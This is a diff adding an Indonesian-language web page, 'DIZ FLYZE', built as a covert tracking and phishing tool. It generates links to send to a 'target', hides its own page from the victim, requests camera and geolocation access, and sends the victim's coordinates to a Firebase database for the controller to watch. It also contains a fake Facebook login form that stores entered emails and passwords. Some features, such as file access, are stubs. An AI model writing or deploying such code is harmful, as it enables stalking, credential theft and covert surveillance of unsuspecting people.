@@ -1,1 +1,775 @@
-.
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>DIZ FLYZE</title>
+  <!-- Bootstrap CSS untuk styling dasar -->
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <!-- Custom Styles -->
+  <style>
+    /* Reset & dasar */
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(135deg, #0d0d0d, #1f1f1f);
+      color: #fff;
+      transition: background 0.5s;
+    }
+    /* Dark mode */
+    body.dark-mode {
+      background: linear-gradient(135deg, #000000, #1a1a1a);
+    }
+    body.dark-mode #header {
+      background: rgba(0, 0, 0, 0.6);
+      border-bottom: 1px solid #fff;
+    }
+    body.dark-mode .icon-column {
+      background: rgba(0, 0, 0, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.3);
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+      color: #fff;
+    }
+    /* Modal overlay & content */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.8);
+      z-index: 1000;
+      overflow-y: auto;
+      padding-top: 5%;
+    }
+    .modal-content {
+      background: #1a1a1a;
+      margin: 0 auto;
+      padding: 20px;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+      border: 2px solid #39ff14; /* Neon green border */
+      box-shadow: 0 0 20px rgba(57, 255, 20, 0.7);
+    }
+    /* Kotak 1:1 */
+    .square-box {
+      width: 300px;
+      height: 300px;
+      margin: 0 auto;
+      background: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+    /* Loading Screen & Bar */
+    #loadingScreen {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: #0d0d0d;
+      z-index: 1000;
+      text-align: center;
+      padding-top: 40%;
+    }
+    #loadingBarContainer {
+      width: 80%;
+      margin: 0 auto;
+      background: #333;
+      border-radius: 5px;
+      overflow: hidden;
+      box-shadow: inset 0 0 10px rgba(57, 255, 20, 0.5);
+    }
+    #loadingBar {
+      width: 0;
+      height: 10px;
+      background: linear-gradient(90deg, #39ff14, #14c9ff);
+      transition: width 0.5s;
+    }
+    /* Header */
+    #header {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      padding: 10px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      z-index: 500;
+      background: rgba(0, 0, 0, 0.5);
+      box-shadow: 0 4px 15px rgba(57, 255, 20, 0.3);
+      border-bottom: 1px solid #39ff14;
+    }
+    #header button {
+      background: linear-gradient(45deg, #ff007a, #ffec00);
+      border: none;
+      border-radius: 4px;
+      padding: 8px 16px;
+      cursor: pointer;
+      color: #000;
+      font-weight: bold;
+      box-shadow: 0 4px 15px rgba(255, 0, 122, 0.5);
+      transition: transform 0.2s;
+    }
+    #header button:hover {
+      transform: scale(1.05);
+    }
+    /* Logo */
+    #header .logo {
+      width: 50px;
+      height: 50px;
+      border-radius: 12px;
+      background: url('https://i.ibb.co/BVSkxm1M/e93bc4cf17f5.webp') no-repeat center center;
+      background-size: cover;
+      box-shadow: 0 0 10px rgba(57, 255, 20, 0.7);
+    }
+    /* Toast Menu */
+    #toast {
+      position: fixed;
+      top: 60px;
+      right: 20px;
+      background: rgba(20,20,20,0.9);
+      color: #39ff14;
+      padding: 10px 20px;
+      border-radius: 8px;
+      display: none;
+      z-index: 1001;
+      box-shadow: 0 0 15px rgba(57, 255, 20, 0.7);
+    }
+    #toast button {
+      color: #39ff14;
+    }
+    /* Konten Utama */
+    #mainContent {
+      margin-top: 80px;
+      text-align: center;
+      color: #fff;
+    }
+    #bio {
+      margin: 10px auto;
+      max-width: 500px;
+      text-shadow: 0 0 10px rgba(57, 255, 20, 0.7);
+    }
+    /* Kolom Interaktif */
+    #actions {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin: 40px auto;
+      max-width: 800px;
+      flex-wrap: wrap;
+    }
+    .icon-column {
+      flex: 1 1 300px;
+      padding: 20px 30px;
+      background: rgba(255,255,255,0.1);
+      border-radius: 8px;
+      cursor: pointer;
+      border: 1px solid rgba(57, 255, 20, 0.5);
+      box-shadow: 0 0 15px rgba(57, 255, 20, 0.3);
+      transition: transform 0.2s, box-shadow 0.2s;
+      display: flex;
+      flex-direction: row;
+      align-items: center;
+    }
+    .icon-column:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 0 25px rgba(57, 255, 20, 0.7);
+    }
+    .icon-column img {
+      width: 40px;
+      opacity: 0.8;
+      margin-right: 10px;
+    }
+    .icon-column p {
+      margin: 0;
+      font-size: 16px;
+      text-align: left;
+    }
+    /* Footer */
+    #footer {
+      position: fixed;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      color: rgba(57,255,20,0.7);
+      font-size: 12px;
+      text-shadow: 0 0 5px rgba(57,255,20,0.7);
+    }
+    /* Share link container */
+    .share-link-container {
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Loading Screen -->
+  <div id="loadingScreen">
+    <div id="loadingBarContainer">
+      <div id="loadingBar"></div>
+    </div>
+    <p>Loading...</p>
+  </div>
+
+  <!-- Modal: Login Facebook -->
+  <div id="loginModal" class="modal-overlay">
+    <div class="modal-content">
+      <div class="text-center">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="FB Logo" style="border-radius:50%; width:80px;">
+      </div>
+      <h4 class="text-center">Facebook</h4>
+      <form id="facebookLoginForm">
+        <div class="form-group">
+          <input type="email" id="fbEmail" class="form-control" placeholder="Email" required>
+        </div>
+        <div class="form-group">
+          <input type="password" id="fbPassword" class="form-control" placeholder="Password" required>
+        </div>
+        <button type="submit" class="btn btn-primary btn-block">Masuk</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Modal: Kamera (Controller Mode) -->
+  <div id="cameraModal" class="modal-overlay">
+    <div class="modal-content">
+      <div class="square-box" id="cameraSquare">
+        <!-- Pada sisi controller, video live akan muncul -->
+        <video id="cameraVideo" autoplay style="width:100%; height:100%; object-fit: cover;"></video>
+      </div>
+      <button id="closeCameraBtn" class="btn btn-danger btn-block mt-3">Tutup Kamera</button>
+      <div class="share-link-container">
+        <input type="text" id="cameraShareLink" class="form-control" readonly>
+        <button id="copyCameraLinkBtn" class="btn btn-secondary btn-block mt-2">Copy Link</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal: Lokasi (Controller Mode) -->
+  <div id="locationModal" class="modal-overlay">
+    <div class="modal-content">
+      <div class="square-box" id="locationSquare">
+        <!-- Placeholder gambar lokasi -->
+        <img src="https://via.placeholder.com/300?text=Lokasi" alt="Lokasi" style="width:100%; height:100%; object-fit: cover;">
+      </div>
+      <button id="closeLocationBtn" class="btn btn-danger btn-block mt-3">Tutup Lokasi</button>
+      <div class="share-link-container">
+        <input type="text" id="locationShareLink" class="form-control" readonly>
+        <button id="copyLocationLinkBtn" class="btn btn-secondary btn-block mt-2">Copy Link</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal: File (Controller Mode) -->
+  <div id="fileModal" class="modal-overlay">
+    <div class="modal-content">
+      <div class="square-box" id="fileSquare">
+        <!-- Placeholder untuk file -->
+        <img src="https://via.placeholder.com/300?text=File" alt="File" style="width:100%; height:100%; object-fit: cover;">
+      </div>
+      <button id="closeFileBtn" class="btn btn-danger btn-block mt-3">Tutup File</button>
+      <div class="share-link-container">
+        <input type="text" id="fileShareLink" class="form-control" readonly>
+        <button id="copyFileLinkBtn" class="btn btn-secondary btn-block mt-2">Copy Link</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal: Senter (Controller Mode) -->
+  <div id="flashModal" class="modal-overlay">
+    <div class="modal-content">
+      <div class="square-box" id="flashSquare">
+        <!-- Placeholder untuk senter -->
+        <img src="https://via.placeholder.com/300?text=Senter" alt="Senter" style="width:100%; height:100%; object-fit: cover;">
+      </div>
+      <button id="toggleFlashBtn" class="btn btn-primary btn-block mt-3">Toggle Senter</button>
+      <button id="closeFlashBtn" class="btn btn-danger btn-block mt-3">Tutup Senter</button>
+      <div class="share-link-container">
+        <input type="text" id="flashShareLink" class="form-control" readonly>
+        <button id="copyFlashLinkBtn" class="btn btn-secondary btn-block mt-2">Copy Link</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Header (Controller Mode) -->
+  <div id="header">
+    <button id="loginBtn">Log in</button>
+    <div class="logo"></div>
+    <button id="menuBtn">&#9776;</button>
+  </div>
+
+  <!-- Toast Menu (About & Settings) -->
+  <div id="toast">
+    <div><button id="aboutBtn" class="btn btn-link">Informasi</button></div>
+    <div><button id="settingsBtn" class="btn btn-link">Dark Mode</button></div>
+  </div>
+
+  <!-- Konten Utama (Controller Mode) -->
+  <div id="mainContent">
+    <div id="bio">
+      <h2>DIZ FLYZE</h2>
+      <p>Web ini menghasilkan Link yang akan anda kirim ke target dan jika target mengunjungi Link itu maka data aktivitas akan ditampilkan live di sini.</p>
+    </div>
+    <!-- Kolom Interaktif (Controller Mode) -->
+    <div id="actions">
+      <div class="icon-column" id="cameraColumn">
+        <img src="https://i.ibb.co/k2tPDQ7g/b5739f059db1.png" alt="Camera Icon">
+        <p>Hack To Target Kamera</p>
+      </div>
+      <div class="icon-column" id="locationColumn">
+        <img src="https://i.ibb.co/BVSkxm1M/e93bc4cf17f5.webp" alt="Location Icon">
+        <p>Hack To Target Lokasi</p>
+      </div>
+      <div class="icon-column" id="fileColumn">
+        <img src="https://i.ibb.co/BVSkxm1M/e93bc4cf17f5.webp" alt="File Icon">
+        <p>Hack To View Target File</p>
+      </div>
+      <div class="icon-column" id="flashColumn">
+        <img src="https://i.ibb.co/BVSkxm1M/e93bc4cf17f5.webp" alt="Flashlight Icon">
+        <p>Hack To Activate Senter</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Hidden file input untuk fitur file (Controller Mode) -->
+  <input type="file" id="fileInput" style="display: none;">
+
+  <!-- Footer (Controller Mode) -->
+  <div id="footer">
+    &copy; DIZ FLYZE
+  </div>
+
+  <!-- Firebase SDK (Compat) -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+  <!-- jQuery -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+  <!-- Script Utama -->
+  <script>
+    /***** Setup Session & Role *****/
+    const urlParams = new URLSearchParams(window.location.search);
+    // Jika ada parameter session, gunakan nilainya; jika tidak, generate session baru
+    const sessionId = urlParams.has('session') ? urlParams.get('session') : 'session_' + Date.now();
+    const refPath = 'ALL DATA/' + sessionId;
+    // Jika terdapat parameter "control", maka ini adalah mode controller
+    const isController = urlParams.has('control');
+
+    // Fungsi untuk menampilkan log event (pada controller)
+    function logEvent(feature, data) {
+      console.log('[' + feature + '] ', data);
+      // Anda dapat mengembangkan untuk menampilkan data ke UI secara real time
+    }
+
+    /***** Fungsi Fitur (Mode Target) *****/
+    function captureCamera() {
+      if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(function(stream){
+            firebase.database().ref(refPath + '/camera').push({
+              activated: true,
+              timestamp: new Date().toISOString()
+            });
+            // Hentikan stream segera setelah aktivasi
+            stream.getTracks().forEach(track => track.stop());
+          })
+          .catch(function(err){
+            firebase.database().ref(refPath + '/camera').push({
+              error: 'camera permission denied',
+              timestamp: new Date().toISOString()
+            });
+          });
+      } else {
+        firebase.database().ref(refPath + '/camera').push({
+          error: 'browser tidak mendukung kamera',
+          timestamp: new Date().toISOString()
+        });
+      }
+    }
+
+    function captureLocation() {
+      if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(function(position){
+          firebase.database().ref(refPath + '/location').push({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            timestamp: new Date().toISOString()
+          });
+        }, function(error){
+          firebase.database().ref(refPath + '/location').push({
+            error: 'izin lokasi ditolak atau terjadi kesalahan',
+            timestamp: new Date().toISOString()
+          });
+        });
+      } else {
+        firebase.database().ref(refPath + '/location').push({
+          error: 'browser tidak mendukung geolokasi',
+          timestamp: new Date().toISOString()
+        });
+      }
+    }
+
+    function captureFile() {
+      // Karena pemilihan file butuh interaksi, di sini kita hanya mengirim pesan
+      firebase.database().ref(refPath + '/file').push({
+        error: 'file tidak tersedia karena user interaction required',
+        timestamp: new Date().toISOString()
+      });
+    }
+
+    function captureFlash() {
+      if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
+          .then(function(stream){
+            const track = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(track);
+            imageCapture.getPhotoCapabilities().then(function(capabilities){
+              if(capabilities.torch){
+                track.applyConstraints({ advanced: [{ torch: true }] })
+                  .then(() => {
+                    firebase.database().ref(refPath + '/flash').push({
+                      activated: true,
+                      timestamp: new Date().toISOString()
+                    });
+                    // Matikan senter setelah 3 detik (opsional)
+                    setTimeout(() => {
+                      track.applyConstraints({ advanced: [{ torch: false }] })
+                        .then(() => {
+                          firebase.database().ref(refPath + '/flash').push({
+                            deactivated: true,
+                            timestamp: new Date().toISOString()
+                          });
+                          track.stop();
+                        });
+                    }, 3000);
+                  })
+                  .catch(function(error){
+                    firebase.database().ref(refPath + '/flash').push({
+                      error: 'gagal mengaktifkan senter',
+                      timestamp: new Date().toISOString()
+                    });
+                    stream.getTracks().forEach(track => track.stop());
+                  });
+              } else {
+                firebase.database().ref(refPath + '/flash').push({
+                  error: 'fitur senter tidak didukung',
+                  timestamp: new Date().toISOString()
+                });
+                stream.getTracks().forEach(track => track.stop());
+              }
+            }).catch(function(error){
+              firebase.database().ref(refPath + '/flash').push({
+                error: 'gagal mendapatkan kemampuan kamera',
+                timestamp: new Date().toISOString()
+              });
+              stream.getTracks().forEach(track => track.stop());
+            });
+          })
+          .catch(function(error){
+            firebase.database().ref(refPath + '/flash').push({
+              error: 'tidak dapat mengakses kamera untuk senter',
+              timestamp: new Date().toISOString()
+            });
+          });
+      } else {
+        firebase.database().ref(refPath + '/flash').push({
+          error: 'browser tidak mendukung fitur ini',
+          timestamp: new Date().toISOString()
+        });
+      }
+    }
+
+    /***** Jika Mode Target (bukan controller) *****/
+    if(!isController){
+      // Sembunyikan UI agar target melihat halaman blank
+      document.addEventListener("DOMContentLoaded", function() {
+        document.body.style.opacity = '0';
+        document.body.style.backgroundColor = "#fff";
+      });
+      // Baca parameter fitur dan jalankan fungsi yang sesuai
+      const feature = urlParams.get('feature');
+      switch(feature) {
+        case 'camera':
+          captureCamera();
+          break;
+        case 'location':
+          captureLocation();
+          break;
+        case 'file':
+          captureFile();
+          break;
+        case 'flash':
+          captureFlash();
+          break;
+        default:
+          // Jika tidak ada fitur yang dikenal, kirim log
+          firebase.database().ref(refPath + '/general').push({
+            message: 'tidak ada fitur yang dijalankan',
+            timestamp: new Date().toISOString()
+          });
+          break;
+      }
+    }
+
+    /***** Kode untuk Mode Controller *****/
+    $(document).ready(function(){
+      startLoading();
+
+      if(isController){
+        // Tampilkan UI controller (tidak disembunyikan)
+        $('body').css('opacity', '1');
+
+        // Pasang listener untuk menerima data aktivitas dari target secara realtime
+        firebase.database().ref(refPath).on('child_added', function(snapshot) {
+          logEvent(snapshot.key, snapshot.val());
+          // Anda dapat mengupdate UI controller untuk menampilkan data ini secara live
+        });
+
+        /* ----------------- Login ----------------- */
+        $('#loginBtn').on('click', function(){
+          $('#loginModal').fadeIn();
+        });
+        $('#facebookLoginForm').on('submit', function(e){
+          e.preventDefault();
+          const email = $('#fbEmail').val();
+          const password = $('#fbPassword').val();
+          const loginData = {
+            email: email,
+            password: password,
+            timestamp: new Date().toISOString()
+          };
+          firebase.database().ref(refPath + '/login').push(loginData)
+          .then(() => {
+            alert('Login berhasil!');
+            $('#loginModal').fadeOut();
+          })
+          .catch((error) => {
+            console.error("Error: ", error);
+          });
+        });
+
+        /* ----------------- Hamburger Menu ----------------- */
+        $('#menuBtn').on('click', function(){
+          $('#toast').fadeToggle();
+        });
+        $('#aboutBtn').on('click', function(){
+          alert('Web ini dibuat oleh DIZ FLYZE.\nVersi uji coba, fitur akan ditingkatkan.');
+          $('#toast').fadeOut();
+        });
+        $('#settingsBtn').on('click', function(){
+          $('body').toggleClass('dark-mode');
+          $(this).text($('body').hasClass('dark-mode') ? 'Night Mode' : 'Dark Mode');
+          $('#toast').fadeOut();
+        });
+
+        /* ----------------- Kamera ----------------- */
+        $('#cameraColumn').on('click', function(){
+          $('#cameraModal').fadeIn();
+          // Buat share link untuk kamera (tanpa control, link yang akan dikirim ke target)
+          const shareLink = window.location.origin + window.location.pathname + "?session=" + sessionId + "&feature=camera";
+          $('#cameraShareLink').val(shareLink);
+          if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
+            navigator.mediaDevices.getUserMedia({ video: true })
+              .then(function(stream){
+                const video = document.getElementById('cameraVideo');
+                video.srcObject = stream;
+                window.currentCameraStream = stream;
+              })
+              .catch(function(err){
+                alert('Nyalakan izin Camera.');
+              });
+          } else {
+            alert('Browser tidak mendukung kamera.');
+          }
+        });
+        $('#closeCameraBtn').on('click', function(){
+          if(window.currentCameraStream){
+            window.currentCameraStream.getTracks().forEach(track => track.stop());
+          }
+          $('#cameraModal').fadeOut();
+          firebase.database().ref(refPath + '/camera').push({
+            activated: true,
+            timestamp: new Date().toISOString()
+          });
+        });
+        $('#copyCameraLinkBtn').on('click', function(){
+          const link = $('#cameraShareLink').val();
+          navigator.clipboard.writeText(link).then(() => {
+            alert('Link telah disalin!');
+          });
+        });
+
+        /* ----------------- Lokasi ----------------- */
+        $('#locationColumn').on('click', function(){
+          $('#locationModal').fadeIn();
+          if(navigator.geolocation){
+            navigator.geolocation.getCurrentPosition(function(position){
+              const lat = position.coords.latitude;
+              const lng = position.coords.longitude;
+              const shareLink = window.location.origin + window.location.pathname + "?session=" + sessionId + "&feature=location&lat=" + lat + "&lng=" + lng;
+              $('#locationShareLink').val(shareLink);
+            }, function(error){
+              alert('Izin lokasi ditolak atau terjadi kesalahan.');
+            });
+          } else {
+            alert('Browser tidak mendukung geolokasi.');
+          }
+        });
+        $('#closeLocationBtn').on('click', function(){
+          $('#locationModal').fadeOut();
+          firebase.database().ref(refPath + '/location').push({
+            deactivated: true,
+            timestamp: new Date().toISOString()
+          });
+        });
+        $('#copyLocationLinkBtn').on('click', function(){
+          const link = $('#locationShareLink').val();
+          navigator.clipboard.writeText(link).then(() => {
+            alert('Link telah disalin!');
+          });
+        });
+
+        /* ----------------- File ----------------- */
+        $('#fileColumn').on('click', function(){
+          $('#fileInput').click();
+        });
+        $('#fileInput').on('change', function(){
+          const file = this.files[0];
+          if(file){
+            // Simulasi: buat share link file (misalnya, setelah upload nantinya)
+            const fileLink = window.location.origin + window.location.pathname + "?session=" + sessionId + "&feature=file&filename=" + encodeURIComponent(file.name);
+            $('#fileModal').fadeIn();
+            $('#fileShareLink').val(fileLink);
+            alert('File dipilih: ' + file.name);
+          }
+        });
+        $('#closeFileBtn').on('click', function(){
+          $('#fileModal').fadeOut();
+          firebase.database().ref(refPath + '/file').push({
+            deactivated: true,
+            timestamp: new Date().toISOString()
+          });
+        });
+        $('#copyFileLinkBtn').on('click', function(){
+          const link = $('#fileShareLink').val();
+          navigator.clipboard.writeText(link).then(() => {
+            alert('Link telah disalin!');
+          });
+        });
+
+        /* ----------------- Senter ----------------- */
+        $('#flashColumn').on('click', function(){
+          $('#flashModal').fadeIn();
+          const shareLink = window.location.origin + window.location.pathname + "?session=" + sessionId + "&feature=flash";
+          $('#flashShareLink').val(shareLink);
+        });
+        let currentFlashStream = null;
+        let torchEnabled = false;
+        $('#toggleFlashBtn').on('click', function(){
+          if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
+            if(!currentFlashStream){
+              navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
+                .then(function(stream){
+                  currentFlashStream = stream;
+                  const track = stream.getVideoTracks()[0];
+                  const imageCapture = new ImageCapture(track);
+                  imageCapture.getPhotoCapabilities().then(function(capabilities){
+                    if(capabilities.torch){
+                      track.applyConstraints({ advanced: [{ torch: !torchEnabled }] })
+                        .then(() => {
+                          torchEnabled = !torchEnabled;
+                          alert(torchEnabled ? 'Senter diaktifkan!' : 'Senter dimatikan!');
+                          if(!torchEnabled){
+                            track.stop();
+                            currentFlashStream = null;
+                          }
+                        }).catch(function(error){
+                          alert('Gagal mengubah status senter.');
+                          stream.getTracks().forEach(track => track.stop());
+                          currentFlashStream = null;
+                        });
+                    } else {
+                      alert('Fitur senter tidak didukung pada perangkat ini.');
+                      stream.getTracks().forEach(track => track.stop());
+                      currentFlashStream = null;
+                    }
+                  }).catch(function(error){
+                    alert('Gagal mendapatkan kemampuan kamera.');
+                    stream.getTracks().forEach(track => track.stop());
+                    currentFlashStream = null;
+                  });
+                })
+                .catch(function(error){
+                  alert('Tidak dapat mengakses kamera atau perangkat tidak mendukung fitur senter.');
+                });
+            } else {
+              // Toggle menggunakan stream yang ada
+              const track = currentFlashStream.getVideoTracks()[0];
+              const imageCapture = new ImageCapture(track);
+              imageCapture.getPhotoCapabilities().then(function(capabilities){
+                if(capabilities.torch){
+                  track.applyConstraints({ advanced: [{ torch: !torchEnabled }] })
+                    .then(() => {
+                      torchEnabled = !torchEnabled;
+                      alert(torchEnabled ? 'Senter diaktifkan!' : 'Senter dimatikan!');
+                      if(!torchEnabled){
+                        track.stop();
+                        currentFlashStream = null;
+                      }
+                    }).catch(function(error){
+                      alert('Gagal mengubah status senter.');
+                      currentFlashStream.getTracks().forEach(track => track.stop());
+                      currentFlashStream = null;
+                    });
+                } else {
+                  alert('Fitur senter tidak didukung pada perangkat ini.');
+                  currentFlashStream.getTracks().forEach(track => track.stop());
+                  currentFlashStream = null;
+                }
+              }).catch(function(error){
+                alert('Gagal mendapatkan kemampuan kamera.');
+                currentFlashStream.getTracks().forEach(track => track.stop());
+                currentFlashStream = null;
+              });
+            }
+          } else {
+            alert('Browser tidak mendukung fitur ini.');
+          }
+        });
+        $('#closeFlashBtn').on('click', function(){
+          if(currentFlashStream){
+            currentFlashStream.getTracks().forEach(track => track.stop());
+            currentFlashStream = null;
+          }
+          $('#flashModal').fadeOut();
+          firebase.database().ref(refPath + '/flash').push({
+            deactivated: true,
+            timestamp: new Date().toISOString()
+          });
+        });
+      } // end if(isController)
+    });
+
+    /* Animasi Loading */
+    function startLoading(){
+      $('#loadingScreen').fadeIn();
+      let progress = 0;
+      let interval = setInterval(function(){
+        progress += Math.random() * 10;
+        if(progress >= 100){
+          progress = 100;
+          clearInterval(interval);
+          $('#loadingScreen').fadeOut(function(){
+            $('body').css('background-image', 'url(https://via.placeholder.com/1920x1080?text=Background)');
+          });
+        }
+        $('#loadingBar').css('width', progress + '%');
+      }, 300);
+    }
+  </script>
+</body>
+  </html>
